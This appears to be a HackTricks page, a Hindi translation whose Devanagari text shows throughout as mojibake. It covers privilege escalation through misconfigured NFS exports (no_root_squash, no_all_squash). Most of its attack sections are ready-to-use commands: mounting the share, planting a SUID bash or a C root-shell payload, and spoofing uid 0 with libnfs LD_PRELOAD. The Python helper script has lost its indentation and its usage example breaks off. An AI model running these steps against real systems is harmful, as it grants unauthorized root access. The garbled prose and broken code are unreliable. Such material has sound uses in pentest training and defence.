<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>


_ **/etc/exports** _ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ, рдпрджрд┐ рдЖрдкрдХреЛ рдХреЛрдИ рдРрд╕реА рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдорд┐рд▓рддреА рд╣реИ рдЬреЛ **no\_root\_squash** рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕реЗ **рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХреНрд╕реЗрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ **рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ рдХрд┐ рдЖрдк рдорд╢реАрди рдХреЗ рд╕реНрдерд╛рдиреАрдп **рд░реВрдЯ** рд╣реЛред

**no\_root\_squash**: рдпрд╣ рд╡рд┐рдХрд▓реНрдк рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдЕрдзрд┐рдХрд╛рд░ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд░ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ NFS рд╕рд░реНрд╡рд░ рдкрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред рдФрд░ рдЗрд╕рд╕реЗ рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзрд┐рдд рдкрд░рд┐рдгрд╛рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

**no\_all\_squash:** рдпрд╣ **no\_root\_squash** рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ **рдЧреИрд░-рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред рдХрд▓реНрдкрдирд╛ рдХрд░реЗрдВ, рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╣реАрдВ рд╣реИ; /etc/exports рдлрд╝рд╛рдЗрд▓ рджреЗрдЦреА; no\_all\_squash рд╡рд┐рдХрд▓реНрдк рдореМрдЬреВрдж рд╣реИ; /etc/passwd рдлрд╝рд╛рдЗрд▓ рджреЗрдЦреА; рдЧреИрд░-рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдореНрдпреБрд▓реЗрдЯ рдХрд░реЗрдВ; рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ suid рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВ (NFS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдЙрдВрдЯ рдХрд░рдХреЗ)ред рдЙрд╕ suid рдХреЛ рдиреЛрдмрдбреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░реЗрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдиреЗрдВред

# рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐

## рд░рд┐рдореЛрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ

рдпрджрд┐ рдЖрдкрдиреЗ рдЗрд╕ рднрдпрдВрдХрд░рддрд╛ рдХреЛ рдкрд╛рдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **рдЙрд╕ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛** рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди рдореЗрдВ, рдФрд░ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ** рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ **/bin/bash** рдмрд╛рдЗрдирд░реА рдХреЙрдкреА рдХрд░рдирд╛ рдФрд░ рдЗрд╕реЗ **SUID** рдЕрдзрд┐рдХрд╛рд░ рджреЗрдирд╛, рдФрд░ **рд╡рд┐рдХреНрдЯрд┐рдо** рдорд╢реАрди рд╕реЗ рдЙрд╕ рдмреИрд╢ рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░рдирд╛ред
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ** рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди рдореЗрдВ, рдФрд░ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ** рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╣рдорд╛рд░рд╛ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЗрд▓реЛрдб рдЬреЛ SUID рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдЙрд╕реЗ **SUID** рдЕрдзрд┐рдХрд╛рд░ рджреЗрдВ, рдФрд░ **рд╡рд┐рдХреНрдЯрд┐рдо** рдорд╢реАрди рд╕реЗ рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреЛ рдЪрд▓рд╛рдПрдВ (рдЖрдк рдпрд╣рд╛рдБ рдХреБрдЫ [рд╕реА SUID рдкреЗрд▓реЛрдб](payloads-to-execute.md#c) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ)ред
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## рд╕реНрдерд╛рдиреАрдп рдЙрддреНрдХреГрд╖реНрдЯрд┐

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдорд╢реАрди рд╕реЗ рдкреАрдбрд╝рд┐рдд рдорд╢реАрди рддрдХ рдПрдХ **рдЯрдирд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕ рдЙрддреНрдХреГрд╖реНрдЯрд┐ рдЙрдиреНрдирдпрди рдХрд╛ рд░рд┐рдореЛрдЯ рд╕рдВрд╕реНрдХрд░рдг рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдЯрдирд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЯреНрд░рд┐рдХ рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдХреЗ рд▓рд┐рдП рд╣реИ рдЬрдм рдлрд╝рд╛рдЗрд▓ `/etc/exports` **рдПрдХ рдЖрдИрдкреА рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рддреА рд╣реИ**ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **рдХрд┐рд╕реА рднреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд░рд┐рдореЛрдЯ рдЙрддреНрдХреГрд╖реНрдЯрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХреЗрдВрдЧреЗ** рдФрд░ рдЖрдкрдХреЛ **рдЗрд╕ рдЯреНрд░рд┐рдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА**ред\
рдЙрддреНрдХреГрд╖реНрдЯрд┐ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рд╢рд░реНрдд рдпрд╣ рд╣реИ рдХрд┐ **`/etc/export` рдХреЗ рднреАрддрд░ рдирд┐рд░реНрдпрд╛рдд** **`insecure` рдзреНрд╡рдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реЛ**ред\
\--_рдореБрдЭреЗ рдпрдХреАрди рдирд╣реАрдВ рд╣реИ рдХрд┐ рдпрджрд┐ `/etc/export` рдПрдХ рдЖрдИрдкреА рдкрддрд╛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдпрд╣ рдЯреНрд░рд┐рдХ рдХрд╛рдо рдХрд░реЗрдЧреА_--
{% endhint %}

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдПрдХ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП NFS рд╕рд╛рдЭрд╛ рдХрд╛ рдЙрддреНрдХреГрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХрд╛ рд╕рдВрдмрдВрдз рд╣реИ, NFSv3 рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдПрдХ рджреЛрд╖ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЬрд┐рд╕рд╕реЗ рдЧреНрд░рд╛рд╣рдХ рдЕрдкрдирд╛ рдпреВрдЖрдИрдбреА/рдЬреАрдЖрдИрдбреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЙрддреНрдХреГрд╖реНрдЯрд┐ [libnfs](https://github.com/sahlberg/libnfs) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдЬреЛ NFS RPC рдХреЙрд▓реНрд╕ рдХрд╛ рдЭреВрдард╛ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рд╕рдВрдХрд▓рди

рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рд╕рдВрдХрд▓рди рдЪрд░рдгреЛрдВ рдореЗрдВ рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕рдорд╛рдпреЛрдЬрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓реЗ рдореЗрдВ, fallocate рд╕рд┐рд╕рдХреЙрд▓реНрд╕ рдХреЛ рдЯрд┐рдкреНрдкрдгреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рд╕рдВрдХрд▓рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢реЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХрд░рдирд╛

рдпрд╣ рдЙрддреНрдкреАрдбрд╝рди рдПрдХ рд╕рд░рд▓ рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо (`pwn.c`) рдмрдирд╛рдиреЗ рдХрд╛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЬрдбрд╝ рджреЗрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдПрдХ рд╢реИрд▓ рдХрд╛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХрд░рддрд╛ рд╣реИред рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдкрд░рд┐рдгрд╛рдореА рдмрд╛рдЗрдирд░реА (`a.out`) рдХреЛ рд╢реЗрдпрд░ рдкрд░ рд╕реБрдЗрдб рд░реВрдЯ рдХреЗ рд╕рд╛рде рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, `ld_nfs.so` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RPC рдХреЙрд▓ рдореЗрдВ uid рдХреЛ рдлрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

1. **рдЙрддреНрдкреАрдбрд╝рди рдХреЛрдб рдХреЛ рдХреЙрдореНрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **рдЙрддреНрдкреАрдбрд╝рди рдХреЛ рд╢реЗрдпрд░ рдкрд░ рд░рдЦреЗрдВ рдФрд░ uid рдХреЛ рдлрд░реНрдЬ рдХрд░рдХреЗ рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрддреНрдкреАрдбрд╝рди рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдВ:**
```bash
/mnt/share/a.out
#root
```

## рдмреЛрдирд╕: NFShell рдХреЗ рд▓рд┐рдП рдЫрд┐рдкреАрд▓реА рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕реЗрд╕
рдПрдХ рдмрд╛рд░ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдирд╛рдо рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдмрджрд▓рдиреЗ рдХреЗ рдмрд┐рдирд╛ NFS рд╢реЗрдпрд░ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ (nfsh.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ uid рдХреЛ рд╕рдорд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП uid рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреБрдордд
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЪрд▓рд╛рдПрдВ:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# рд╕рдВрджрд░реНрдн
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
